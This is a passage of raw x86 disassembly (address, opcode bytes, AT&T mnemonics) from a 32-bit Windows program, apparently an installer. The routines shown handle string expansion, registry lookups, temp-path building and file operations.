  4059c6:	85 c0                	test   %eax,%eax
  4059c8:	75 16                	jne    0x4059e0
  4059ca:	55                   	push   %ebp
  4059cb:	68 0c 85 40 00       	push   $0x40850c
  4059d0:	53                   	push   %ebx
  4059d1:	ff d6                	call   *%esi
  4059d3:	55                   	push   %ebp
  4059d4:	c7 05 c4 37 42 00 00 	movl   $0x408500,0x4237c4
  4059db:	85 40 00 
  4059de:	ff d7                	call   *%edi
  4059e0:	a1 d4 37 42 00       	mov    0x4237d4,%eax
  4059e5:	53                   	push   %ebx
  4059e6:	68 41 4d 40 00       	push   $0x404d41
  4059eb:	83 c0 69             	add    $0x69,%eax
  4059ee:	53                   	push   %ebx
  4059ef:	0f b7 c0             	movzwl %ax,%eax
  4059f2:	50                   	push   %eax
  4059f3:	ff 35 f4 37 42 00    	push   0x4237f4
  4059f9:	ff 15 d4 81 40 00    	call   *0x4081d4
  4059ff:	6a 05                	push   $0x5
  405a01:	8b f0                	mov    %eax,%esi
  405a03:	e8 2b bb ff ff       	call   0x401533
  405a08:	6a 01                	push   $0x1
  405a0a:	e8 d9 e0 ff ff       	call   0x403ae8
  405a0f:	8b c6                	mov    %esi,%eax
  405a11:	eb 1c                	jmp    0x405a2f
  405a13:	53                   	push   %ebx
  405a14:	e8 8e fb ff ff       	call   0x4055a7
  405a19:	85 c0                	test   %eax,%eax
  405a1b:	74 1a                	je     0x405a37
  405a1d:	39 1d ec 37 42 00    	cmp    %ebx,0x4237ec
  405a23:	75 07                	jne    0x405a2c
  405a25:	6a 02                	push   $0x2
  405a27:	e8 07 bb ff ff       	call   0x401533
  405a2c:	6a 02                	push   $0x2
  405a2e:	58                   	pop    %eax
  405a2f:	5f                   	pop    %edi
  405a30:	5e                   	pop    %esi
  405a31:	5d                   	pop    %ebp
  405a32:	5b                   	pop    %ebx
  405a33:	83 c4 10             	add    $0x10,%esp
  405a36:	c3                   	ret
  405a37:	6a 01                	push   $0x1
  405a39:	e8 f5 ba ff ff       	call   0x401533
  405a3e:	e9 df fe ff ff       	jmp    0x405922
  405a43:	56                   	push   %esi
  405a44:	6a fe                	push   $0xfffffffe
  405a46:	be 00 38 42 00       	mov    $0x423800,%esi
  405a4b:	56                   	push   %esi
  405a4c:	e8 b4 01 00 00       	call   0x405c05
  405a51:	56                   	push   %esi
  405a52:	ff 35 d8 05 42 00    	push   0x4205d8
  405a58:	ff 15 fc 81 40 00    	call   *0x4081fc
  405a5e:	8b c6                	mov    %esi,%eax
  405a60:	5e                   	pop    %esi
  405a61:	c3                   	ret
  405a62:	83 ec 40             	sub    $0x40,%esp
  405a65:	53                   	push   %ebx
  405a66:	8b 1d e8 37 42 00    	mov    0x4237e8,%ebx
  405a6c:	85 db                	test   %ebx,%ebx
  405a6e:	0f 84 cc 00 00 00    	je     0x405b40
  405a74:	a1 f4 40 42 00       	mov    0x4240f4,%eax
  405a79:	55                   	push   %ebp
  405a7a:	57                   	push   %edi
  405a7b:	8b f8                	mov    %eax,%edi
  405a7d:	89 44 24 0c          	mov    %eax,0xc(%esp)
  405a81:	bd 00 0e 42 00       	mov    $0x420e00,%ebp
  405a86:	83 e7 01             	and    $0x1,%edi
  405a89:	75 0a                	jne    0x405a95
  405a8b:	ff 74 24 50          	push   0x50(%esp)
  405a8f:	55                   	push   %ebp
  405a90:	e8 70 01 00 00       	call   0x405c05
  405a95:	56                   	push   %esi
  405a96:	55                   	push   %ebp
  405a97:	e8 42 0d 00 00       	call   0x4067de
  405a9c:	8b 74 24 58          	mov    0x58(%esp),%esi
  405aa0:	8b e8                	mov    %eax,%ebp
  405aa2:	85 f6                	test   %esi,%esi
  405aa4:	74 21                	je     0x405ac7
  405aa6:	56                   	push   %esi
  405aa7:	e8 32 0d 00 00       	call   0x4067de
  405aac:	03 c5                	add    %ebp,%eax
  405aae:	3d 00 08 00 00       	cmp    $0x800,%eax
  405ab3:	0f 83 84 00 00 00    	jae    0x405b3d
  405ab9:	56                   	push   %esi
  405aba:	be 00 0e 42 00       	mov    $0x420e00,%esi
  405abf:	56                   	push   %esi
  405ac0:	e8 fd 0c 00 00       	call   0x4067c2
  405ac5:	eb 05                	jmp    0x405acc
  405ac7:	be 00 0e 42 00       	mov    $0x420e00,%esi
  405acc:	8b 44 24 10          	mov    0x10(%esp),%eax
  405ad0:	a8 04                	test   $0x4,%al
  405ad2:	75 11                	jne    0x405ae5
  405ad4:	56                   	push   %esi
  405ad5:	ff 35 c8 37 42 00    	push   0x4237c8
  405adb:	ff 15 fc 81 40 00    	call   *0x4081fc
  405ae1:	8b 44 24 10          	mov    0x10(%esp),%eax
  405ae5:	a8 02                	test   $0x2,%al
  405ae7:	75 49                	jne    0x405b32
  405ae9:	6a 00                	push   $0x0
  405aeb:	6a 00                	push   $0x0
  405aed:	68 04 10 00 00       	push   $0x1004
  405af2:	89 74 24 34          	mov    %esi,0x34(%esp)
  405af6:	8b 35 40 82 40 00    	mov    0x408240,%esi
  405afc:	53                   	push   %ebx
  405afd:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  405b04:	00 
  405b05:	ff d6                	call   *%esi
  405b07:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  405b0c:	2b c7                	sub    %edi,%eax
  405b0e:	89 44 24 18          	mov    %eax,0x18(%esp)
  405b12:	8d 44 24 14          	lea    0x14(%esp),%eax
  405b16:	50                   	push   %eax
  405b17:	6a 00                	push   $0x0
  405b19:	b8 07 10 00 00       	mov    $0x1007,%eax
  405b1e:	2b c7                	sub    %edi,%eax
  405b20:	50                   	push   %eax
  405b21:	53                   	push   %ebx
  405b22:	ff d6                	call   *%esi
  405b24:	6a 00                	push   $0x0
  405b26:	ff 74 24 1c          	push   0x1c(%esp)
  405b2a:	68 13 10 00 00       	push   $0x1013
  405b2f:	53                   	push   %ebx
  405b30:	ff d6                	call   *%esi
  405b32:	85 ff                	test   %edi,%edi
  405b34:	74 07                	je     0x405b3d
  405b36:	c6 85 00 0e 42 00 00 	movb   $0x0,0x420e00(%ebp)
  405b3d:	5e                   	pop    %esi
  405b3e:	5f                   	pop    %edi
  405b3f:	5d                   	pop    %ebp
  405b40:	5b                   	pop    %ebx
  405b41:	83 c4 40             	add    $0x40,%esp
  405b44:	c2 08 00             	ret    $0x8
  405b47:	55                   	push   %ebp
  405b48:	8b ec                	mov    %esp,%ebp
  405b4a:	81 ec 04 01 00 00    	sub    $0x104,%esp
  405b50:	32 d2                	xor    %dl,%dl
  405b52:	56                   	push   %esi
  405b53:	8b 75 08             	mov    0x8(%ebp),%esi
  405b56:	0f b6 ca             	movzbl %dl,%ecx
  405b59:	66 0f be 04 31       	movsbw (%ecx,%esi,1),%ax
  405b5e:	66 89 84 4d fc fe ff 	mov    %ax,-0x104(%ebp,%ecx,2)
  405b65:	ff 
  405b66:	66 85 c0             	test   %ax,%ax
  405b69:	74 0c                	je     0x405b77
  405b6b:	80 c2 01             	add    $0x1,%dl
  405b6e:	79 e6                	jns    0x405b56
  405b70:	b8 05 40 00 80       	mov    $0x80004005,%eax
  405b75:	eb 10                	jmp    0x405b87
  405b77:	ff 75 0c             	push   0xc(%ebp)
  405b7a:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  405b80:	50                   	push   %eax
  405b81:	ff 15 80 82 40 00    	call   *0x408280
  405b87:	5e                   	pop    %esi
  405b88:	c9                   	leave
  405b89:	c3                   	ret
  405b8a:	56                   	push   %esi
  405b8b:	33 f6                	xor    %esi,%esi
  405b8d:	56                   	push   %esi
  405b8e:	ff 74 24 0c          	push   0xc(%esp)
  405b92:	ff 15 84 80 40 00    	call   *0x408084
  405b98:	85 c0                	test   %eax,%eax
  405b9a:	75 08                	jne    0x405ba4
  405b9c:	ff 15 70 80 40 00    	call   *0x408070
  405ba2:	8b f0                	mov    %eax,%esi
  405ba4:	8b c6                	mov    %esi,%eax
  405ba6:	5e                   	pop    %esi
  405ba7:	c2 04 00             	ret    $0x4
  405baa:	55                   	push   %ebp
  405bab:	8b ec                	mov    %esp,%ebp
  405bad:	83 ec 20             	sub    $0x20,%esp
  405bb0:	53                   	push   %ebx
  405bb1:	6a 04                	push   $0x4
  405bb3:	58                   	pop    %eax
  405bb4:	66 89 45 e2          	mov    %ax,-0x1e(%ebp)
  405bb8:	33 db                	xor    %ebx,%ebx
  405bba:	b8 40 85 40 00       	mov    $0x408540,%eax
  405bbf:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  405bc5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405bc8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405bcb:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405bce:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405bd1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405bd4:	50                   	push   %eax
  405bd5:	ff 75 08             	push   0x8(%ebp)
  405bd8:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405bdb:	c7 45 f0 30 85 40 00 	movl   $0x408530,-0x10(%ebp)
  405be2:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405be9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405bec:	ff 15 84 80 40 00    	call   *0x408084
  405bf2:	85 c0                	test   %eax,%eax
  405bf4:	75 08                	jne    0x405bfe
  405bf6:	ff 15 70 80 40 00    	call   *0x408070
  405bfc:	8b d8                	mov    %eax,%ebx
  405bfe:	8b c3                	mov    %ebx,%eax
  405c00:	5b                   	pop    %ebx
  405c01:	c9                   	leave
  405c02:	c2 04 00             	ret    $0x4
  405c05:	8b 44 24 08          	mov    0x8(%esp),%eax
  405c09:	83 ec 1c             	sub    $0x1c,%esp
  405c0c:	85 c0                	test   %eax,%eax
  405c0e:	79 11                	jns    0x405c21
  405c10:	8b 0d e0 37 42 00    	mov    0x4237e0,%ecx
  405c16:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  405c1d:	2b c8                	sub    %eax,%ecx
  405c1f:	8b 01                	mov    (%ecx),%eax
  405c21:	8b 0d 38 40 42 00    	mov    0x424038,%ecx
  405c27:	ba a0 2f 42 00       	mov    $0x422fa0,%edx
  405c2c:	53                   	push   %ebx
  405c2d:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  405c31:	03 c8                	add    %eax,%ecx
  405c33:	57                   	push   %edi
  405c34:	8b fa                	mov    %edx,%edi
  405c36:	3b da                	cmp    %edx,%ebx
  405c38:	72 13                	jb     0x405c4d
  405c3a:	8b c3                	mov    %ebx,%eax
  405c3c:	2b c2                	sub    %edx,%eax
  405c3e:	3d 00 08 00 00       	cmp    $0x800,%eax
  405c43:	73 08                	jae    0x405c4d
  405c45:	8b fb                	mov    %ebx,%edi
  405c47:	33 db                	xor    %ebx,%ebx
  405c49:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  405c4d:	80 39 00             	cmpb   $0x0,(%ecx)
  405c50:	0f 84 1a 02 00 00    	je     0x405e70
  405c56:	55                   	push   %ebp
  405c57:	56                   	push   %esi
  405c58:	8b c7                	mov    %edi,%eax
  405c5a:	8b e9                	mov    %ecx,%ebp
  405c5c:	2b c2                	sub    %edx,%eax
  405c5e:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405c62:	3d 00 04 00 00       	cmp    $0x400,%eax
  405c67:	0f 8d fd 01 00 00    	jge    0x405e6a
  405c6d:	8a 11                	mov    (%ecx),%dl
  405c6f:	80 fa 04             	cmp    $0x4,%dl
  405c72:	0f 83 ce 01 00 00    	jae    0x405e46
  405c78:	0f be 5d 02          	movsbl 0x2(%ebp),%ebx
  405c7c:	0f be 49 01          	movsbl 0x1(%ecx),%ecx
  405c80:	8b f3                	mov    %ebx,%esi
  405c82:	83 e6 7f             	and    $0x7f,%esi
  405c85:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  405c89:	8b c1                	mov    %ecx,%eax
  405c8b:	c1 e6 07             	shl    $0x7,%esi
  405c8e:	83 e0 7f             	and    $0x7f,%eax
  405c91:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  405c95:	0b f0                	or     %eax,%esi
  405c97:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  405c9b:	8b c1                	mov    %ecx,%eax
  405c9d:	0d 00 80 00 00       	or     $0x8000,%eax
  405ca2:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  405ca6:	8b c3                	mov    %ebx,%eax
  405ca8:	0d 00 80 00 00       	or     $0x8000,%eax
  405cad:	89 44 24 24          	mov    %eax,0x24(%esp)
  405cb1:	80 fa 02             	cmp    $0x2,%dl
  405cb4:	0f 85 38 01 00 00    	jne    0x405df2
  405cba:	80 3d fc 40 42 00 00 	cmpb   $0x0,0x4240fc
  405cc1:	75 1c                	jne    0x405cdf
  405cc3:	b8 5a 04 00 00       	mov    $0x45a,%eax
  405cc8:	66 39 05 fe 40 42 00 	cmp    %ax,0x4240fe
  405ccf:	73 0e                	jae    0x405cdf
  405cd1:	83 fb 23             	cmp    $0x23,%ebx
  405cd4:	74 09                	je     0x405cdf
  405cd6:	83 fb 2e             	cmp    $0x2e,%ebx
  405cd9:	74 04                	je     0x405cdf
  405cdb:	33 d2                	xor    %edx,%edx
  405cdd:	eb 03                	jmp    0x405ce2
  405cdf:	33 d2                	xor    %edx,%edx
  405ce1:	42                   	inc    %edx
  405ce2:	83 3d c4 40 42 00 00 	cmpl   $0x0,0x4240c4
  405ce9:	6a 02                	push   $0x2
  405ceb:	5d                   	pop    %ebp
  405cec:	6a 04                	push   $0x4
  405cee:	58                   	pop    %eax
  405cef:	0f 45 e8             	cmovne %eax,%ebp
  405cf2:	89 54 24 34          	mov    %edx,0x34(%esp)
  405cf6:	84 c9                	test   %cl,%cl
  405cf8:	79 35                	jns    0x405d2f
  405cfa:	8b c1                	mov    %ecx,%eax
  405cfc:	83 e1 3f             	and    $0x3f,%ecx
  405cff:	03 0d 38 40 42 00    	add    0x424038,%ecx
  405d05:	83 e0 40             	and    $0x40,%eax
  405d08:	50                   	push   %eax
  405d09:	57                   	push   %edi
  405d0a:	51                   	push   %ecx
  405d0b:	68 6c 85 40 00       	push   $0x40856c
  405d10:	68 02 00 00 80       	push   $0x80000002
  405d15:	e8 1a 09 00 00       	call   0x406634
  405d1a:	80 3f 00             	cmpb   $0x0,(%edi)
  405d1d:	0f 85 b2 00 00 00    	jne    0x405dd5
  405d23:	53                   	push   %ebx
  405d24:	57                   	push   %edi
  405d25:	e8 db fe ff ff       	call   0x405c05
  405d2a:	e9 a1 00 00 00       	jmp    0x405dd0
  405d2f:	83 f9 25             	cmp    $0x25,%ecx
  405d32:	75 11                	jne    0x405d45
  405d34:	68 00 04 00 00       	push   $0x400
  405d39:	57                   	push   %edi
  405d3a:	ff 15 4c 81 40 00    	call   *0x40814c
  405d40:	e9 8b 00 00 00       	jmp    0x405dd0
  405d45:	83 f9 24             	cmp    $0x24,%ecx
  405d48:	75 0e                	jne    0x405d58
  405d4a:	68 00 04 00 00       	push   $0x400
  405d4f:	57                   	push   %edi
  405d50:	ff 15 a8 80 40 00    	call   *0x4080a8
  405d56:	eb 78                	jmp    0x405dd0
  405d58:	8b 44 ac 18          	mov    0x18(%esp,%ebp,4),%eax
  405d5c:	4d                   	dec    %ebp
  405d5d:	8b 0d f0 37 42 00    	mov    0x4237f0,%ecx
  405d63:	83 e0 bf             	and    $0xffffffbf,%eax
  405d66:	8b f0                	mov    %eax,%esi
  405d68:	89 44 24 10          	mov    %eax,0x10(%esp)
  405d6c:	81 e6 00 80 00 00    	and    $0x8000,%esi
  405d72:	85 c9                	test   %ecx,%ecx
  405d74:	74 16                	je     0x405d8c
  405d76:	85 d2                	test   %edx,%edx
  405d78:	74 12                	je     0x405d8c
  405d7a:	57                   	push   %edi
  405d7b:	6a 00                	push   $0x0
  405d7d:	6a 00                	push   $0x0
  405d7f:	50                   	push   %eax
  405d80:	ff 35 f8 37 42 00    	push   0x4237f8
  405d86:	ff d1                	call   *%ecx
  405d88:	85 c0                	test   %eax,%eax
  405d8a:	74 40                	je     0x405dcc
  405d8c:	6a 07                	push   $0x7
  405d8e:	e8 10 08 00 00       	call   0x4065a3
  405d93:	8b c8                	mov    %eax,%ecx
  405d95:	8b 44 24 10          	mov    0x10(%esp),%eax
  405d99:	56                   	push   %esi
  405d9a:	0f b6 c0             	movzbl %al,%eax
  405d9d:	50                   	push   %eax
  405d9e:	ff 35 f8 37 42 00    	push   0x4237f8
  405da4:	ff d1                	call   *%ecx
  405da6:	8b d8                	mov    %eax,%ebx
  405da8:	85 db                	test   %ebx,%ebx
  405daa:	74 15                	je     0x405dc1
  405dac:	57                   	push   %edi
  405dad:	53                   	push   %ebx
  405dae:	ff 15 70 81 40 00    	call   *0x408170
  405db4:	53                   	push   %ebx
  405db5:	8b f0                	mov    %eax,%esi
  405db7:	ff 15 88 82 40 00    	call   *0x408288
  405dbd:	85 f6                	test   %esi,%esi
  405dbf:	75 0b                	jne    0x405dcc
  405dc1:	8b 54 24 34          	mov    0x34(%esp),%edx
  405dc5:	c6 07 00             	movb   $0x0,(%edi)
  405dc8:	85 ed                	test   %ebp,%ebp
  405dca:	75 8c                	jne    0x405d58
  405dcc:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  405dd0:	80 3f 00             	cmpb   $0x0,(%edi)
  405dd3:	74 11                	je     0x405de6
  405dd5:	83 fb 1a             	cmp    $0x1a,%ebx
  405dd8:	75 0c                	jne    0x405de6
  405dda:	68 98 85 40 00       	push   $0x408598
  405ddf:	57                   	push   %edi
  405de0:	ff 15 58 81 40 00    	call   *0x408158
  405de6:	57                   	push   %edi
  405de7:	e8 bf 0b 00 00       	call   0x4069ab
  405dec:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405df0:	eb 47                	jmp    0x405e39
  405df2:	80 fa 03             	cmp    $0x3,%dl
  405df5:	75 34                	jne    0x405e2b
  405df7:	83 fe 1d             	cmp    $0x1d,%esi
  405dfa:	75 0e                	jne    0x405e0a
  405dfc:	ff 35 f8 37 42 00    	push   0x4237f8
  405e02:	57                   	push   %edi
  405e03:	e8 be 04 00 00       	call   0x4062c6
  405e08:	eb 2f                	jmp    0x405e39
  405e0a:	8b c6                	mov    %esi,%eax
  405e0c:	c1 e0 0a             	shl    $0xa,%eax
  405e0f:	05 00 50 42 00       	add    $0x425000,%eax
  405e14:	50                   	push   %eax
  405e15:	57                   	push   %edi
  405e16:	e8 ad 09 00 00       	call   0x4067c8
  405e1b:	8d 46 eb             	lea    -0x15(%esi),%eax
  405e1e:	83 f8 07             	cmp    $0x7,%eax
  405e21:	73 16                	jae    0x405e39
  405e23:	57                   	push   %edi
  405e24:	e8 82 0b 00 00       	call   0x4069ab
  405e29:	eb 0e                	jmp    0x405e39
  405e2b:	80 fa 01             	cmp    $0x1,%dl
  405e2e:	75 09                	jne    0x405e39
  405e30:	f7 d6                	not    %esi
  405e32:	56                   	push   %esi
  405e33:	57                   	push   %edi
  405e34:	e8 cc fd ff ff       	call   0x405c05
  405e39:	57                   	push   %edi
  405e3a:	ff 15 a0 80 40 00    	call   *0x4080a0
  405e40:	03 f8                	add    %eax,%edi
  405e42:	6a 03                	push   $0x3
  405e44:	eb 0a                	jmp    0x405e50
  405e46:	75 0b                	jne    0x405e53
  405e48:	8a 41 01             	mov    0x1(%ecx),%al
  405e4b:	88 07                	mov    %al,(%edi)
  405e4d:	47                   	inc    %edi
  405e4e:	6a 02                	push   $0x2
  405e50:	58                   	pop    %eax
  405e51:	eb 06                	jmp    0x405e59
  405e53:	88 17                	mov    %dl,(%edi)
  405e55:	33 c0                	xor    %eax,%eax
  405e57:	47                   	inc    %edi
  405e58:	40                   	inc    %eax
  405e59:	8d 0c 28             	lea    (%eax,%ebp,1),%ecx
  405e5c:	ba a0 2f 42 00       	mov    $0x422fa0,%edx
  405e61:	80 39 00             	cmpb   $0x0,(%ecx)
  405e64:	0f 85 ee fd ff ff    	jne    0x405c58
  405e6a:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  405e6e:	5e                   	pop    %esi
  405e6f:	5d                   	pop    %ebp
  405e70:	c6 07 00             	movb   $0x0,(%edi)
  405e73:	85 db                	test   %ebx,%ebx
  405e75:	74 09                	je     0x405e80
  405e77:	52                   	push   %edx
  405e78:	53                   	push   %ebx
  405e79:	e8 4a 09 00 00       	call   0x4067c8
  405e7e:	eb 02                	jmp    0x405e82
  405e80:	8b c2                	mov    %edx,%eax
  405e82:	5f                   	pop    %edi
  405e83:	5b                   	pop    %ebx
  405e84:	83 c4 1c             	add    $0x1c,%esp
  405e87:	c2 08 00             	ret    $0x8
  405e8a:	8b 54 24 04          	mov    0x4(%esp),%edx
  405e8e:	33 c0                	xor    %eax,%eax
  405e90:	38 05 fc 40 42 00    	cmp    %al,0x4240fc
  405e96:	56                   	push   %esi
  405e97:	57                   	push   %edi
  405e98:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405e9c:	be 00 01 00 00       	mov    $0x100,%esi
  405ea1:	0f 4c f0             	cmovl  %eax,%esi
  405ea4:	8b 07                	mov    (%edi),%eax
  405ea6:	a8 20                	test   $0x20,%al
  405ea8:	74 38                	je     0x405ee2
  405eaa:	f7 c2 00 00 00 60    	test   $0x60000000,%edx
  405eb0:	74 30                	je     0x405ee2
  405eb2:	53                   	push   %ebx
  405eb3:	8b ca                	mov    %edx,%ecx
  405eb5:	bb 00 03 00 00       	mov    $0x300,%ebx
  405eba:	c1 e9 15             	shr    $0x15,%ecx
  405ebd:	23 cb                	and    %ebx,%ecx
  405ebf:	3b cb                	cmp    %ebx,%ecx
  405ec1:	5b                   	pop    %ebx
  405ec2:	75 0a                	jne    0x405ece
  405ec4:	8b ce                	mov    %esi,%ecx
  405ec6:	f7 d1                	not    %ecx
  405ec8:	23 0d f0 40 42 00    	and    0x4240f0,%ecx
  405ece:	25 ff fe ff ff       	and    $0xfffffeff,%eax
  405ed3:	0b c1                	or     %ecx,%eax
  405ed5:	25 ff fd ff ff       	and    $0xfffffdff,%eax
  405eda:	81 e2 ff ff ff 9f    	and    $0x9fffffff,%edx
  405ee0:	eb 0d                	jmp    0x405eef
  405ee2:	a9 00 00 10 00       	test   $0x100000,%eax
  405ee7:	74 06                	je     0x405eef
  405ee9:	0b 05 f0 40 42 00    	or     0x4240f0,%eax
  405eef:	8b c8                	mov    %eax,%ecx
  405ef1:	6a 00                	push   $0x0
  405ef3:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  405ef9:	85 c6                	test   %eax,%esi
  405efb:	58                   	pop    %eax
  405efc:	89 0f                	mov    %ecx,(%edi)
  405efe:	0f 45 d0             	cmovne %eax,%edx
  405f01:	5f                   	pop    %edi
  405f02:	8b c2                	mov    %edx,%eax
  405f04:	5e                   	pop    %esi
  405f05:	c2 08 00             	ret    $0x8
  405f08:	55                   	push   %ebp
  405f09:	8b ec                	mov    %esp,%ebp
  405f0b:	81 ec 20 01 00 00    	sub    $0x120,%esp
  405f11:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405f17:	56                   	push   %esi
  405f18:	be 04 01 00 00       	mov    $0x104,%esi
  405f1d:	56                   	push   %esi
  405f1e:	50                   	push   %eax
  405f1f:	ff 15 4c 81 40 00    	call   *0x40814c
  405f25:	3b c6                	cmp    %esi,%eax
  405f27:	5e                   	pop    %esi
  405f28:	77 18                	ja     0x405f42
  405f2a:	85 c0                	test   %eax,%eax
  405f2c:	74 14                	je     0x405f42
  405f2e:	8d 84 05 e0 fe ff ff 	lea    -0x120(%ebp,%eax,1),%eax
  405f35:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%eax)
  405f39:	74 0d                	je     0x405f48
  405f3b:	b9 98 82 40 00       	mov    $0x408298,%ecx
  405f40:	eb 0b                	jmp    0x405f4d
  405f42:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405f48:	b9 99 82 40 00       	mov    $0x408299,%ecx
  405f4d:	ff 75 08             	push   0x8(%ebp)
  405f50:	51                   	push   %ecx
  405f51:	68 14 87 40 00       	push   $0x408714
  405f56:	50                   	push   %eax
  405f57:	ff 15 44 82 40 00    	call   *0x408244
  405f5d:	83 c4 10             	add    $0x10,%esp
  405f60:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405f66:	6a 08                	push   $0x8
  405f68:	6a 00                	push   $0x0
  405f6a:	50                   	push   %eax
  405f6b:	ff 15 f8 80 40 00    	call   *0x4080f8
  405f71:	c9                   	leave
  405f72:	c2 04 00             	ret    $0x4
  405f75:	55                   	push   %ebp
  405f76:	8b ec                	mov    %esp,%ebp
  405f78:	83 ec 1c             	sub    $0x1c,%esp
  405f7b:	eb 0a                	jmp    0x405f87
  405f7d:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405f80:	50                   	push   %eax
  405f81:	ff 15 80 81 40 00    	call   *0x408180
  405f87:	6a 01                	push   $0x1
  405f89:	ff 75 08             	push   0x8(%ebp)
  405f8c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405f8f:	ff 75 08             	push   0x8(%ebp)
  405f92:	6a 00                	push   $0x0
  405f94:	50                   	push   %eax
  405f95:	ff 15 ec 81 40 00    	call   *0x4081ec
  405f9b:	85 c0                	test   %eax,%eax
  405f9d:	75 de                	jne    0x405f7d
  405f9f:	c9                   	leave
  405fa0:	c2 04 00             	ret    $0x4
  405fa3:	6a 05                	push   $0x5
  405fa5:	ff 74 24 0c          	push   0xc(%esp)
  405fa9:	ff 74 24 0c          	push   0xc(%esp)
  405fad:	ff 15 5c 81 40 00    	call   *0x40815c
  405fb3:	85 c0                	test   %eax,%eax
  405fb5:	75 0f                	jne    0x405fc6
  405fb7:	ff 74 24 08          	push   0x8(%esp)
  405fbb:	ff 74 24 08          	push   0x8(%esp)
  405fbf:	e8 72 00 00 00       	call   0x406036
  405fc4:	59                   	pop    %ecx
  405fc5:	59                   	pop    %ecx
  405fc6:	ff 05 d0 40 42 00    	incl   0x4240d0
  405fcc:	c2 08 00             	ret    $0x8
  405fcf:	ff 25 50 81 40 00    	jmp    *0x408150
  405fd5:	55                   	push   %ebp
  405fd6:	8b ec                	mov    %esp,%ebp
  405fd8:	8d 45 10             	lea    0x10(%ebp),%eax
  405fdb:	50                   	push   %eax
  405fdc:	ff 75 08             	push   0x8(%ebp)
  405fdf:	e8 a6 fe ff ff       	call   0x405e8a
  405fe4:	85 c0                	test   %eax,%eax
  405fe6:	75 05                	jne    0x405fed
  405fe8:	6a 06                	push   $0x6
  405fea:	58                   	pop    %eax
  405feb:	eb 17                	jmp    0x406004
  405fed:	33 c9                	xor    %ecx,%ecx
  405fef:	51                   	push   %ecx
  405ff0:	ff 75 14             	push   0x14(%ebp)
  405ff3:	51                   	push   %ecx
  405ff4:	ff 75 10             	push   0x10(%ebp)
  405ff7:	51                   	push   %ecx
  405ff8:	51                   	push   %ecx
  405ff9:	51                   	push   %ecx
  405ffa:	ff 75 0c             	push   0xc(%ebp)
  405ffd:	50                   	push   %eax
  405ffe:	ff 15 28 80 40 00    	call   *0x408028
  406004:	5d                   	pop    %ebp
  406005:	c2 10 00             	ret    $0x10
  406008:	55                   	push   %ebp
  406009:	8b ec                	mov    %esp,%ebp
  40600b:	8d 45 10             	lea    0x10(%ebp),%eax
  40600e:	50                   	push   %eax
  40600f:	ff 75 08             	push   0x8(%ebp)
  406012:	e8 73 fe ff ff       	call   0x405e8a
  406017:	85 c0                	test   %eax,%eax
  406019:	75 05                	jne    0x406020
  40601b:	6a 06                	push   $0x6
  40601d:	58                   	pop    %eax
  40601e:	eb 12                	jmp    0x406032
  406020:	ff 75 14             	push   0x14(%ebp)
  406023:	ff 75 10             	push   0x10(%ebp)
  406026:	6a 00                	push   $0x0
  406028:	ff 75 0c             	push   0xc(%ebp)
  40602b:	50                   	push   %eax
  40602c:	ff 15 2c 80 40 00    	call   *0x40802c
  406032:	5d                   	pop    %ebp
  406033:	c2 10 00             	ret    $0x10
  406036:	53                   	push   %ebx
  406037:	55                   	push   %ebp
  406038:	56                   	push   %esi
  406039:	8b 74 24 14          	mov    0x14(%esp),%esi
  40603d:	bb 00 04 00 00       	mov    $0x400,%ebx
  406042:	c7 05 48 26 42 00 4e 	movl   $0x4c554e,0x422648
  406049:	55 4c 00 
  40604c:	bd 48 26 42 00       	mov    $0x422648,%ebp
  406051:	57                   	push   %edi
  406052:	8b 3d ec 80 40 00    	mov    0x4080ec,%edi
  406058:	85 f6                	test   %esi,%esi
  40605a:	74 26                	je     0x406082
  40605c:	6a 01                	push   $0x1
  40605e:	6a 00                	push   $0x0
  406060:	56                   	push   %esi
  406061:	e8 72 05 00 00       	call   0x4065d8
  406066:	50                   	push   %eax
  406067:	ff 15 08 81 40 00    	call   *0x408108
  40606d:	53                   	push   %ebx
  40606e:	55                   	push   %ebp
  40606f:	56                   	push   %esi
  406070:	ff d7                	call   *%edi
  406072:	85 c0                	test   %eax,%eax
  406074:	0f 84 e8 00 00 00    	je     0x406162
  40607a:	3b c3                	cmp    %ebx,%eax
  40607c:	0f 8f e0 00 00 00    	jg     0x406162
  406082:	53                   	push   %ebx
  406083:	be 48 22 42 00       	mov    $0x422248,%esi
  406088:	56                   	push   %esi
  406089:	ff 74 24 1c          	push   0x1c(%esp)
  40608d:	ff d7                	call   *%edi
  40608f:	85 c0                	test   %eax,%eax
  406091:	0f 84 cb 00 00 00    	je     0x406162
  406097:	3b c3                	cmp    %ebx,%eax
  406099:	0f 8f c3 00 00 00    	jg     0x406162
  40609f:	56                   	push   %esi
  4060a0:	55                   	push   %ebp
  4060a1:	68 fc 86 40 00       	push   $0x4086fc
  4060a6:	68 48 1e 42 00       	push   $0x421e48
  4060ab:	ff 15 44 82 40 00    	call   *0x408244
